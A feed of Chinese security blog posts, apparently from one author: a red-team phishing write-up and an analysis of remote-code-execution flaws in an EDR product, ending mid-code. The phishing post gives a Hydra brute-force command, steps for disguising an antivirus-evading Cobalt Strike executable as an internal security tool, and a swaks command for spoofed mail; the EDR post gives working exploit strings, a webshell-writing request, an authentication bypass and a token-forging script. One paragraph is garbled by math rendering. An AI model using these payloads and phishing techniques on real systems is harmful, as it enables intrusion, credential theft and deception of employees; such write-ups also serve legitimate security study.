<p>熟悉的模板和ico，在哪里看过。一顿搜索，发现使用的 <code>roundcube</code> 进行搭建。匆忙地搜索历史漏洞，在 Github 上搜索web端的爆破，均无收获...此时心想，难道要自己写一个爆破脚本嘛。此时收到一位来自赛博空间的人事指点</p>
<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1601396752138.png" alt="" loading="lazy"></figure>
<p>......对噢，为什么老盯着web呢。确认不是CDN节点后，开心的开启nmap扫描</p>
<figure data-type="image" tabindex="3"><img src="https://chriskalix.github.io/post-images/1601396765478.png" alt="" loading="lazy"></figure>
<p>.......还真的开着，整挺好。爆破都是基本操作了，无非就是工具+字典。公司名就叫xxx吧，构造如下</p>
<table>
<thead>
<tr>
<th>工具</th>
<th>字典</th>
</tr>
</thead>
<tbody>
<tr>
<td>Hydra</td>
<td>用户名字典：top中文名500@xxx.com<br />密码字典：xxx@2020,xxx@2019等等...</td>
</tr>
</tbody>
</table>
<p>字典部分手动构造，但是不宜太大，因为smtps爆破较为缓慢，一旦线程设置过多还存在 <code>timeout</code> ，所以就尽量小字典。启动的指令如下所示：</p>
<p><code>hydra -q -L username.txt -P password.txt ip地址 smtps</code></p>
<p>此时已经到中午了，吃个饭回来在看</p>
<h3 id="邮箱信息">邮箱信息</h3>
<blockquote>
<p>这里都是普通操作，无非就是爆破和搜集</p>
</blockquote>
<p>吃完饭后回来查看，嚯，还真有一个。那么爆破就可以停止了，进去邮箱就能发现我们需要的东西，登录后点击联系人</p>
<figure data-type="image" tabindex="4"><img src="https://chriskalix.github.io/post-images/1601396779841.png" alt="" loading="lazy"></figure>
<p>在这就能找到所有用户的信息了</p>
<figure data-type="image" tabindex="5"><img src="https://chriskalix.github.io/post-images/1601396785923.png" alt="" loading="lazy"></figure>
<p>点击导出，获取到所有用户组的信息。同时不要忘记了稍微翻阅一下邮件，找到较为官方的发件人，如管理中心，人力中心，安全部门等等，同时导出模板作为后续钓鱼的准备。到目前为止，已有的信息为：</p>
<ol>
<li>该公司组织架构关系</li>
<li>所有员工的邮箱以及姓名</li>
<li>官方发送的历史邮件</li>
<li>一个员工的账号密码</li>
</ol>
<p>当然，可以导出员工再进行爆破，获取更多的邮箱和信息，然而目前我认为信息已经足够，可以开始着手钓鱼。</p>
<h2 id="载荷制作">载荷制作</h2>
<blockquote>
<p>这一步事实上非常关键，但是正如之前内网入门篇所提及到的，我对免杀这块还没有原理性的深入，所以还是惭愧的以使用工具为主</p>
</blockquote>
<h3 id="前置说明">前置说明</h3>
<p>本次投递由 <code>BypassAV</code> 生成，但是本身 <code>cobaltstrike</code> 会有较多的特征，如默认的60秒回连等等，所以需要先选好 <code>malleable_c2.profile</code> 模板，一定程度修改特征。</p>
<h3 id="免杀制作">免杀制作</h3>
<p>这一部分其实花费了不少功夫，最初采用 CHM 的方式，参考的文章为 <a href="https://www.freebuf.com/articles/network/208897.html">Freebuf文章</a>。起初通过CHM远程下载，本地加载运行，但是这种拉跨的方式很快的被杀了。中间还做了 js 混淆等，但均于事无补... 这部分做的不好，后期我会重新复盘。<br>
由于时间紧迫，没有太多时间让我学习免杀，匆忙之下找到了 Github 上的免杀项目 <a href="https://github.com/hack2fun/BypassAV">BypassAV</a>（当然还有著名的掩日，但是已经被杀的死死的了）</p>
<figure data-type="image" tabindex="6"><img src="https://chriskalix.github.io/post-images/1601396798907.png" alt="" loading="lazy"></figure>
<p>神奇的是这个项目时过两月，依然能过 <code>windows defender</code> ，但是比较单一，只能直接生成 exe 程序。但这并不影响我们进行投递，有个免杀的程序已经十分知足</p>
<h3 id="增加迷惑性">增加迷惑性</h3>
<blockquote>
<p>单独的一个exe是非常让人困惑的，排除模板以外，exe本身也应该做一些特殊处理</p>
</blockquote>
<p>这里使用的工具为 <code>Resource Hacker</code> ，为exe添加一个 ico 。至于这个 ico 怎么来的，其实只要去该公司官网把 ico 扒下来即可。要注意一定是ico，如果是png需要格式转化为ico（改后缀行不通）</p>
<figure data-type="image" tabindex="7"><img src="https://chriskalix.github.io/post-images/1601396810381.png" alt="" loading="lazy"></figure>
<p>由于 exe 非常突兀，什么情况下用户会使用exe呢，于是我捏造的想法为让他们相信这是一个 <strong>内部安全工具</strong> ...那么就应该加个 UAC ，一是理所应当，二是增加权限，两全其美<br>
但是问题来了，怎么添加呢...突然看到了自己桌面上的 phpstudy，突然灵光一闪</p>
<figure data-type="image" tabindex="8"><img src="https://chriskalix.github.io/post-images/1601396816298.png" alt="" loading="lazy"></figure>
<p>一顿搜索，发现只要修改 exe 中的 manifest，在里面申明需要administrator权限即可，于是直接扒下 phpstudy 的manifest，如下所示：</p>
<pre><code class="language-xml">&lt;?xml version='1.0' encoding='UTF-8' standalone='yes'?&gt;
&lt;assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'&gt;
  &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;
    &lt;security&gt;
      &lt;requestedPrivileges&gt;
        &lt;requestedExecutionLevel level='requireAdministrator' uiAccess='false' /&gt;
      &lt;/requestedPrivileges&gt;
    &lt;/security&gt;
  &lt;/trustInfo&gt;
&lt;/assembly&gt;
</code></pre>
<p>同样，在Resource Hacker里面进行操作</p>
<figure data-type="image" tabindex="9"><img src="https://chriskalix.github.io/post-images/1601396825069.png" alt="" loading="lazy"></figure>
<p>最后制作成功截图如下所示，双击后弹出大大的UAC，这里就不重复截图了，总之挺好使，加上了大盾牌，看起来也更加可靠了呢</p>
<figure data-type="image" tabindex="10"><img src="https://chriskalix.github.io/post-images/1601396854180.png" alt="" loading="lazy"></figure>
<p>当然了，这里其实还有一个小小的问题，就是这个 exe太小了，1M左右...觉得不太好的师傅可以自己想想办法把它搞大。<br>
最后记得打包成zip，加上一个具有公司特征的密码，如xxx2020</p>
<h3 id="模板制作">模板制作</h3>
<blockquote>
<p>这里要用到先前登录后拿到的官方模板</p>
</blockquote>
<p>一个好的钓鱼邮件，最关键的是做戏要全套，切勿偷懒。这一部分较为敏感，就不再详细截图了。总结一下我制作的过程：</p>
<ol>
<li>扣下官方邮件签名</li>
<li>选定主题，本次选择网络安全查杀工具</li>
<li>使用以前的模板（例如官方邮件的开头：大家好，或者同事好等等）</li>
<li>用之前爆破的邮箱自己给自己发一封修改好的钓鱼邮件，保存下 <code>eml</code>格式</li>
</ol>
<p><strong>[*]</strong> 注：这里为什么要自己给自己发一封呢？因为之前尝试过将签名以图片形式附属在邮件下方，在 Outlook 看下是正常的，网页端和foxmail不正常显示，即 用拼凑的形式存在兼容性的问题。所以最佳的方式是从网页端登录后设置自己的签名为历史邮件中官方的签名，然后发给自己并且导出eml。</p>
<h2 id="载荷投递">载荷投递</h2>
<blockquote>
<p>投递也是一个细心活</p>
</blockquote>
<h3 id="前置重点">前置重点</h3>
<p>很多人发邮件都是批量群发，这其实有个问题。例如：我模仿xx部门发送邮件，一定要避免xx部门自身，因为这样会很快被发现。同样的大范围的投递也不是一个好的选择，这一定会引起同事们的讨论和怀疑，很快就会暴露。<br>
由于之前已经获得了组织架构，我选择了对某一个部门进行专门投递，避免大范围<br>
**[*]**重点：当然还有更详细的，在<a href="https://payloads.online/archivers/2020-02-05/1">倾旋</a>的博客里。包括SPF等等，由于博客年前清空，已经暂时找不到了，对于基础知识，大家可以在上面的博客中找到学习，这里更注重的是整个流程</p>
<h3 id="批量投递">批量投递</h3>
<p>同样由于时间紧急，没有太多的时间优雅的执行一整套流程，这里也是直接用swaks进行投递，指令如下</p>
<pre><code class="language-bash">swaks --data &quot;之前保存的eml文件&quot; --h-from &quot;伪造邮件名&quot; --from xx@smtp2go --to &quot;投递对象&quot; --server mail.smtp2go.com -p 2525 -au username -ap password
</code></pre>
<p>这里更加详细的可以看倾旋的<a href="https://payloads.online/archivers/2019-05-09/1">这篇博客</a>，更加详细的解释了为什么要使用smtp2go等等<br>
然后写个bash或者python在shell里执行就完事了</p>
<h2 id="收杆成果">收杆成果</h2>
<blockquote>
<p>投递出时已经是若干天的中午，下午打开CS后，我们开心的开始收杆工作</p>
</blockquote>
<p>当然是先看一眼机器啦，投递的几十个目标，上线了6个（当然其实不止，后续陆续上线了很多）</p>
<figure data-type="image" tabindex="11"><img src="https://chriskalix.github.io/post-images/1601396866456.png" alt="" loading="lazy"></figure>
<h3 id="确认身份">确认身份</h3>
<p>由于需要确认被钓人的身份，光有他的 computer name 肯定是不够的，我们需要翻阅文件找到个人信息。此时的思路有如下四个：</p>
<ol>
<li>找到微信相关信息</li>
<li>抓取浏览器凭证，获取信息</li>
<li>翻阅其他文件，如记录保存的word，excel等</li>
<li>暂未学习到的<a href="http://blog.leanote.com/post/snowming/4e07af1cab60">雪姐 Brower Pivoting</a>，来直接查看邮箱，OA等</li>
</ol>
<p>首先没用过浏览器凭证工具的我忍不住尝试<a href="https://github.com/QAX-A-Team/BrowserGhost">BrowserGhost</a>，这款Ateam出品的浏览器密钥抓取工具。奈何奇奇怪怪的问题始终无法成功执行（本地机器上没有问题），遂暂时放弃</p>
<p>于是重新尝试方法1，微信相关凭证<br>
这个好办那，直接在 <code>C:\Users\你的用户名\Documents\WeChat Files\</code> 下就能看到相关文件了，由于目标机不便展示，我展示一下我的本机</p>
<figure data-type="image" tabindex="12"><img src="https://chriskalix.github.io/post-images/1601396876009.png" alt="" loading="lazy"></figure>
<p>然而得到的是一个wxid_xxxxxx，他不是一个直接可以添加的wx账号，这就头疼了。一番询问后 AK 师傅告诉我，这是可以找到对应关系的，需要生成二维码然后扫码。在搜索后，我发现了一个简单的网站 https://wxid.ltd/ ，输入 ID 即可生成二维码，扫描即可（iphone不行不知道为啥，只能安卓）<br>
感兴趣的师傅可以在测试一下自己的</p>
<h3 id="匆匆的横向">匆匆的横向</h3>
<p>由于快要到下班的点了，而我又不想做驻留（因为本次目的是证明危害，不需要持久控制），明白下班后就会掉线，于是匆匆挂上代理，扫了一下C段。这里闹了个笑话，因为忘记看本地的杀软，不小心掉了两台机器hhh<br>
发现xxx.xxx.xx.1上开了个WEB，一个弱口令进了AP管理后台，截图一下仅为证明，便开始写报告</p>
<figure data-type="image" tabindex="13"><img src="https://chriskalix.github.io/post-images/1601396884034.png" alt="" loading="lazy"></figure>
<p>其实还有很多设备，如打印机等，耐心的话可以从以下思路继续扩展</p>
<ol>
<li>驻留当前所有shell</li>
<li>横向个人PC机，找关键数据，服务器信息等（有的会把账号密码以txt，doc的形式放在桌面）</li>
<li>获取到的信息继续向服务器扩展，进一步扩大关键信息</li>
</ol>
<h2 id="最终总结">最终总结</h2>
<p>本次钓鱼算是一次流程上比较完整的测试，但是仍发现了一些不足点</p>
<ol>
<li>过度依赖现成工具免杀，导致投递样本、免杀效果完全依赖工具本身，这一点需要慢慢学习后改进</li>
<li>不够细心，在上线后匆忙扫描C段，导致触发本地杀软被拦截下线。这如果对于只有少量机器上线的情况，是非常大的损失</li>
<li>横向思路不明确，一直向横向不知道在横啥，以后要想清楚，要控制关键的设备</li>
<li>原理上的认知缺失，如邮件的SPF，免杀等，需要慢慢补充</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hvv小记]]></title>
        <id>https://chriskalix.github.io/post/mvIL5VDju/</id>
        <link href="https://chriskalix.github.io/post/mvIL5VDju/">
        </link>
        <updated>2020-09-22T06:31:43.000Z</updated>
        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1600756478756.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[某edr实战分析]]></title>
        <id>https://chriskalix.github.io/post/QpDpOlp0Y/</id>
        <link href="https://chriskalix.github.io/post/QpDpOlp0Y/">
        </link>
        <updated>2020-08-28T01:41:16.000Z</updated>
        <content type="html"><![CDATA[<h1 id="某edr分析">某edr分析</h1>
<blockquote>
<p>近期某edr的洞小火了一把，有幸分析一下，仅供参考。看了宽字节的文章，其实还有很多这种，但是很多都是有前置判断的，虽然代码不行，但是确实大部分都不是直接能从前台开始执行的</p>
</blockquote>
<blockquote>
<p>官方的修复方法即为删除了 tool 和 store 目录 （也行，挺彻底的）</p>
</blockquote>
<h2 id="rce">RCE</h2>
<p>这里基本都是同样的套路，extract变量覆盖直接执行</p>
<h3 id="0x01-rce-1">0x01 RCE - 1</h3>
<p>这个也是最先被爆出来的RCE点，其实非常简单，很快就能找出执行点。该执行点在 <code>tool/c.php</code> 下，入口点函数为</p>
<pre><code class="language-php">$show_form($_REQUEST);
</code></pre>
<p>跟进后</p>
<pre><code class="language-php">$show_form = function($params) use(&amp;$strip_slashes, &amp;$show_input) {
    extract($params);
    $host  = isset($host)  ? $strip_slashes($host)  : &quot;127.0.0.1&quot;;
    $path  = isset($path)  ? $strip_slashes($path)  : &quot;&quot;;
    $row   = isset($row)   ? $strip_slashes($row)   : &quot;&quot;;
    $limit = isset($limit) ? $strip_slashes($limit) : 1000;
    echo &quot;&lt;pre&gt;&quot;;
    echo '&lt;form id=&quot;studio&quot; name=&quot;studio&quot; method=&quot;post&quot; action=&quot;&quot;&gt;';
    $show_input(array(&quot;title&quot; =&gt; &quot;Host &quot;,  &quot;name&quot; =&gt; &quot;host&quot;,  &quot;value&quot; =&gt; $host,  &quot;note&quot; =&gt; &quot; - host, e.g. 127.0.0.1&quot;));
    $show_input(array(&quot;title&quot; =&gt; &quot;Path &quot;,  &quot;name&quot; =&gt; &quot;path&quot;,  &quot;value&quot; =&gt; $path,  &quot;note&quot; =&gt; &quot; - path regex, e.g. mapreduce&quot;));
    $show_input(array(&quot;title&quot; =&gt; &quot;Row  &quot;,  &quot;name&quot; =&gt; &quot;row&quot;,   &quot;value&quot; =&gt; $row,   &quot;note&quot; =&gt; &quot; - row regex, e.g. \s[w|e]\s&quot;));
    $show_input(array(&quot;title&quot; =&gt; &quot;Limit&quot;,  &quot;name&quot; =&gt; &quot;limit&quot;, &quot;value&quot; =&gt; $limit, &quot;note&quot; =&gt; &quot; - top n, e.g. 100&quot;));
    echo '&lt;input type=&quot;submit&quot; id=&quot;button&quot;&gt;';
    echo '&lt;/form&gt;';
    echo &quot;&lt;/pre&gt;&quot;;
};
</code></pre>
<p>......一步就到位了，所以截图里面的参数为 <code>?strip_slashes=system&amp;host=id</code> ，第二个参数(host)可以改成path,row,limit都可以(这个也太简单了...)</p>
<h3 id="0x02-rce-2bad">0x02 RCE - 2(BAD)</h3>
<p>有些代码没加载进来，所以注释了上面的一部分，不影响。这次找到的是，同个样子的。搜寻的思路就是既然能写出上述代码，肯定不止一处。所以在 <code>tool/mdd_sql.php</code> 下又有一处 rce，熟悉的入口点</p>
<pre><code class="language-php">$show_form($_REQUEST);
</code></pre>
<p>熟悉的跟进函数</p>
<pre><code class="language-php">$show_form = function($params) 
    use(&amp;$strip_slashes, &amp;$show_input, &amp;$show_radio, &amp;$show_text) {
    extract($params);
    $root = isset($root) ? $strip_slashes($root) : &quot;&quot;;
    $sql  = isset($sql) ? $strip_slashes($sql) : &quot;&quot;;
    $limit = isset($limit) ? $strip_slashes($limit) : &quot;1000&quot;;
    $output = isset($output) ? $strip_slashes($output) : &quot;&quot;;
    $console = isset($console) ? $strip_slashes($console) : &quot;off&quot;;
    $mdd = isset($mdd) ? $strip_slashes($mdd) : &quot;off&quot;;

    // 绘制表单
    echo '&lt;form id=&quot;studio&quot; name=&quot;studio&quot; method=&quot;post&quot; action=&quot;&quot;&gt;';
    $show_radio(&quot;console&quot;, &quot;Console&quot;, array(&quot;on&quot; =&gt; &quot;on&quot;, &quot;off&quot; =&gt; &quot;off&quot;), &quot; - run as console mode&quot;, $console);
    $show_radio(&quot;mdd&quot;,     &quot;Mdd    &quot;, array(&quot;on&quot; =&gt; &quot;on&quot;, &quot;off&quot; =&gt; &quot;off&quot;), &quot; - 仅获取结果集分区路径&quot;, $mdd);
    $show_input(array(&quot;title&quot; =&gt; &quot;Limit&quot;, &quot;name&quot; =&gt; &quot;limit&quot;, &quot;value&quot; =&gt; $limit, &quot;note&quot; =&gt; &quot; - 最终作业结果集条数&quot;));
    $show_input(array(&quot;title&quot; =&gt; &quot;Output&quot;, &quot;name&quot; =&gt; &quot;output&quot;, &quot;value&quot; =&gt; $output, &quot;note&quot; =&gt; &quot; - 指定输出结果集的作业，多个作业使用\&quot;,\&quot;分隔&quot;));
    $show_input(array(&quot;title&quot; =&gt; &quot;Root&quot;, &quot;name&quot; =&gt; &quot;root&quot;, &quot;value&quot; =&gt; $root, &quot;note&quot; =&gt; &quot; - 根路径，默认空则使用内置数据集&quot;));        
    $show_text(array(&quot;title&quot; =&gt; &quot;SQL&quot;, &quot;name&quot; =&gt; &quot;sql&quot;, &quot;value&quot; =&gt; $sql, &quot;note&quot; =&gt; &quot; - SQL&quot;));
    echo '&lt;input type=&quot;submit&quot; id=&quot;button&quot;&gt; ';
    echo '&lt;/form&gt;';
    echo &quot;\n&quot;;
};
</code></pre>
<p>所以poc也是简单的 <code>?strip_slashes=system&amp;root=whoami</code> ，这个root同理也是可以替换的，替换成sql,limit,output,console都可以</p>
<h3 id="0x03-rce-3bad">0x03 RCE - 3(BAD)</h3>
<p>熟悉的配方，熟悉的味道，在同个文件 <code>tool/mdd_sql.php</code> 下还是有，入口点</p>
<pre><code class="language-php">$main($_REQUEST);
</code></pre>
<p>跟进，熟悉的变量覆盖执行</p>
<pre><code class="language-php">$main = function($argv)
    use(&amp;$time, &amp;$eval) {
    global $ldb_has_console;
    extract($argv);
    if (!isset($sql) || !isset($root)) {
        return;
    }
    $sql = $eval($sql);
    if (isset($console)) {
        $ldb_has_console = ($console == &quot;on&quot;);
    }
......
</code></pre>
<p>所以 poc 为 <code>?sql=whoami&amp;root=123&amp;eval=system</code> ，其中root有值就行</p>
<h3 id="0x04-rce-4bad">0x04 RCE - 4(BAD)</h3>
<p>这里其实有预判断的</p>
<pre><code class="language-php">$dc_tool_flag = ldb_ext_root().&quot;/php/enable_dc_tool&quot;;
if (!file_exists($dc_tool_flag)) {
    die;
}
</code></pre>
<p>ldb_ext_root这个函数没有，所以猜测是代码脱下来的问题8....<br>
跳过这个函数先不看，直接看入口+执行</p>
<pre><code class="language-php">$main = function($argv) {
    extract($argv);
    if (!isset($code)) {
        return;
    }
    eval($code);
};

set_time_limit(0);
echo '&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; Content=&quot;text/html; Charset=gb2312&quot;&gt;&lt;/head&gt;';
echo '&lt;body bgcolor=&quot;#e8ddcb&quot;&gt;';
echo &quot;&lt;p&gt;&lt;b&gt;PHP Code Eval&lt;/b&gt;&lt;/p&gt;&quot;;
$show_form($_REQUEST);
echo &quot;&lt;pre&gt;&quot;;
$main($_REQUEST);
echo &quot;&lt;/pre&gt;&quot;;  
</code></pre>
<p>一样的，直接传入 code 即可，直接就执行了 poc 为 <code>?code=phpinfo();</code></p>
<h2 id="getshell">Getshell</h2>
<h3 id="0x01-getshell-1">0x01 Getshell - 1</h3>
<p>同样的是变量覆盖的问题，不过这里的变量有点多，文件为<code>/tool/c.php</code></p>
<p>入口点</p>
<pre><code class="language-php">$main($_REQUEST);
</code></pre>
<p>跟进</p>
<pre><code class="language-php">$main = function($argv) 
    use(&amp;$collect) {
    extract($argv);
    if (!isset($limit)) {
        return;
    }
    $result = $collect($path, $row, $limit, $host);
    if (!is_array($result)) {
        echo $result, &quot;\n&quot;;
        return;
    }
    if (!isset($result[&quot;success&quot;]) || $result[&quot;success&quot;] !== true) {
        echo $result, &quot;\n&quot;;
        return;
    }
    foreach ($result[&quot;data&quot;] as $host =&gt; $items) {
        $last = &quot;&quot;;
        foreach ($items as $item) {
            if ($item[&quot;name&quot;] != $last) {
                $last = $item[&quot;name&quot;];
                echo &quot;\n[$host] -&gt; $last\n\n&quot;;
            }
            echo $item[&quot;item&quot;], &quot;\n&quot;;
        }
    }
};
</code></pre>
<p>这里传参太多了，本来想用proc_exec，但是捣鼓了一下没搞成。曲线救国，直接写shell吧。<br>
poc为 <code>?collect=file_put_contents&amp;path=test.php&amp;row=&lt;?php+phpinfo();?&gt;&amp;limit=0</code><br>
写了test.php，访问后会生成<br>
<img src="https://chriskalix.github.io/post-images/1598578919297.png" alt="" loading="lazy"></p>
<h2 id="风险点">风险点</h2>
<p>这个代表不是通杀，可能为异常</p>
<h3 id="0x01-admin登录">0x01 Admin登录</h3>
<p>昨晚（20200819）有爆出来说 <code>/ui/login</code> 存在admin登录绕过问题，其实那个代码已经看过了，展示一下，部分如下</p>
<pre><code class="language-php">function check_free_loginbyscl()
{
    //免密条件
    //***、SCL分支端127.0.0.2 （代理配置只能有127.0.0.2进入到这） Jim
    //soc 通过bbc通道后代理ip是172.0.0.1
    $docker = false;
    if(isset($_COOKIE[&quot;scl_session&quot;]) &amp;&amp; isset($_COOKIE[&quot;username&quot;])){
        $check = $_COOKIE[&quot;scl_session&quot;];
        $username = $_COOKIE[&quot;username&quot;];
    }
    if(file_exists(getenv(&quot;EPS_INSTALL_ROOT&quot;) . &quot;config/docker.ini&quot;)){
        $ini_content = parse_ini_file(getenv(&quot;EPS_INSTALL_ROOT&quot;) . &quot;config/docker.ini&quot;, true);
    }
    if(isset($ini_content[$username][&quot;scl_session&quot;]) &amp;&amp; $ini_content[$username][&quot;scl_session&quot;] == $check){
        $docker = true;
    }
    if((isset($_SERVER[&quot;REMOTE_ADDR&quot;]) &amp;&amp; (&quot;127.0.0.2&quot; == $_SERVER[&quot;REMOTE_ADDR&quot;] || &quot;127.0.0.1&quot; == $_SERVER[&quot;REMOTE_ADDR&quot;]))
        || $docker)
    {
        //构造session
        if(isset($_GET[&quot;user&quot;]))
        {
            $auth_value[&quot;auth_user&quot;] = $_GET[&quot;user&quot;];
        }
        elseif($docker)
        {
            $auth_value[&quot;auth_user&quot;] = $username;
        }
        else
        {
            //$auth_value[&quot;auth_user&quot;] = &quot;SCLOUDE&quot;;
            //免密登录后，人为loginout，还是需要密码登录，url不一样
            return;
        }
</code></pre>
<p>因为全局搜入口的时候已经看到这里了，当时稍微看了一下，没想到<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>可能被做反向代理的情况。当然后来key仔也说了，这个只有在配置不当的情况下才有可能存在漏洞。这个的poc为<code>?user=admin</code> 。判断条件就是REMOTE_ADDR是否为127.0.0.1或者127.0.0.2或者是在$docker里。</p>
<h1 id="分界线-ovf实例分析">分界线 - ovf实例分析</h1>
<blockquote>
<p>由于第一次拿到的是部分代码，有些地方没法跟进调试，如今拿到了0703版本的ovf虚拟机，装上后重新调试分析。提及一下，上述的风险点默认是没有的。</p>
</blockquote>
<h2 id="蜈蚣一号-权限绕过">蜈蚣一号 - 权限绕过</h2>
<p>这个不是我审计的，是keykey审计出来的，看完之后我反思了一下自己的错误点。</p>
<ol>
<li>不够细心</li>
<li>对百度查出的结果过于信任，没有自己去细究原理</li>
</ol>
<h3 id="入口点">入口点</h3>
<p>由于输入的可控点较少（尤其是更新后剔除了 tool 目录以及 store 目录），在vscode里正则匹配输入源 <code>\$_(REQUEST|POST|GET)</code> 很快就能找到。其中觉得有戏的是 <code>divideUploader.php</code> 这个文件<br>
<img src="https://chriskalix.github.io/post-images/1598578932792.png" alt="" loading="lazy"></p>
<p>可以看到做了权限预认证，才能去触发，我们接着跟进</p>
<h3 id="跟进函数">跟进函数</h3>
<p>全局搜索$auto_auth_check，在auth.php的796行被定义，ldb开头的两个函数可以跟进去，其实都是固定值，一个从文件读取，一个判断是否为命令行执行<br>
<img src="https://chriskalix.github.io/post-images/1598578981520.png" alt="" loading="lazy"></p>
<p>所以跟进$super_ip_check进行查看</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1598578987970.png" alt="" loading="lazy"></figure>
<p>看到先调用$get_user_ip，我们连续跟进查看调用</p>
<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1598578994074.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://chriskalix.github.io/post-images/1598579001993.png" alt="" loading="lazy"></figure>
<p>可以看到其实就是从os.json文件里读出特权IP，但是默认情况下是没有特权IP的。那么我们重新回到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>u</mi><mi>p</mi><mi>e</mi><msub><mi>r</mi><mi>i</mi></msub><msub><mi>p</mi><mi>c</mi></msub><mi>h</mi><mi>e</mi><mi>c</mi><mi>k</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">逻</mi><mi mathvariant="normal">辑</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">坑</mi><mi mathvariant="normal">点</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">地</mi><mi mathvariant="normal">方</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">去</mi><mi mathvariant="normal">搜</mi><mi mathvariant="normal">索</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">super_ip_check的逻辑里，这里就是我坑点的地方了。我去搜索了 `</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault">p</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">逻</span><span class="mord cjk_fallback">辑</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">坑</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">去</span><span class="mord cjk_fallback">搜</span><span class="mord cjk_fallback">索</span><span class="mord cjk_fallback">了</span><span class="mord">‘</span></span></span></span>_SERVER['HTTP_Y_FORWARDED_FOR']` (没见过，一般都是X)，快速发现说是Nginx自动配置......于是我跳过了这个地方。而实际上，这个地方是可控的<br>
翻阅了2分钟的文档没有发现，于是自己实验了一下。$_SERVER中HTTP_开头的键值是从请求报文里面截取的，即为攻击者可控数据。随便实验了一下<br>
<img src="https://chriskalix.github.io/post-images/1598579008986.png" alt="" loading="lazy"></p>
<p>那么思路很明确了，只要自定义一个头 Y_FORWARDED_FOR 为空，即可被判定为 super_ip 绕过权限验证。这里加入头 Y-Forwarded-For即可。但是这里我的是3.2.21版本，已经修复了，所以不能使用，进一步分析可以看Neo攻防组的文章，我就不做搬运工了</p>
<h2 id="二号-无条件rce-0day">二号 - 无条件RCE - 0day</h2>
<p>首先cssp有个token预校验，代码如下<br>
<code>dev_linkage_launch.php</code></p>
<pre><code class="language-php">function check_access_token($access_token, $req_url){

    // token base64解码
    $token_str = base64_decode($access_token);

    // json_decode一下
    $json_token = json_decode($token_str, true);
    $key = get_item_from_os_json(&quot;privateKey&quot;);
    if($key == &quot;&quot; &amp;&amp; $req_url == STD_CSSP_DOWN_CONF_URL) {
        $key = STD_CSSP_DEFAULT_KEY;
    }
    $md5_str = md5($key.$json_token[&quot;random&quot;]);
    if($md5_str == $json_token[&quot;md5&quot;]) {
        return 0;
    }

    ldb_error(&quot;check token failed&quot;);
    return 1;
}
</code></pre>
<p>这里直接构造即可</p>
<pre><code class="language-php">&lt;?php
$a = '{&quot;random&quot;:&quot;1&quot;,&quot;md5&quot;:&quot;c4ca4238a0b923820dcc509a6f75849b&quot;}';
echo(base64_encode($a));
?&gt;
</code></pre>
<p>即可输出正确的token值</p>
<pre><code class="language-php">$exec_slog_action = function($object,$params){
    $data = $params[&quot;data&quot;];
    var_dump($data[&quot;params&quot;]);

    if (!isset($data[&quot;params&quot;])) {
        ldb_error(&quot;required parameter missing params is&quot;.json_encode($params));
        $object-&gt;err_code = EXEC_SLOG_ACTION_PARAM_ERROR;
        return -1;
    }

    $data[&quot;params&quot;] = ldb_mapreduce_invoke(&quot;call_method&quot;, &quot;app.web.common.validation.shell_injection_check&quot;,
        &quot;shell_argv_transform&quot;, $data[&quot;params&quot;]);

    $command = &quot;curl -k 'http://127.0.0.1:9081/?&quot;.$data[&quot;params&quot;].&quot;'&quot;;
    var_dump($command);
